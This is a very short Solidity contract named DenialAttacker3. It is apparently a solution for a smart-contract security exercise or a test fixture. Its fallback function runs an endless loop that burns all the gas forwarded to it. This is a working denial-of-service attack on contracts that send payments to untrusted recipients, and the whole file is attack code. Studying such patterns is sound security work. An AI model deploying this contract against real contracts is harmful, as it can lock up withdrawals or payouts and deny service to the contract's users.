contract DenialAttacker3 { 
  fallback() external payable {
    while (true) {}
  } 
}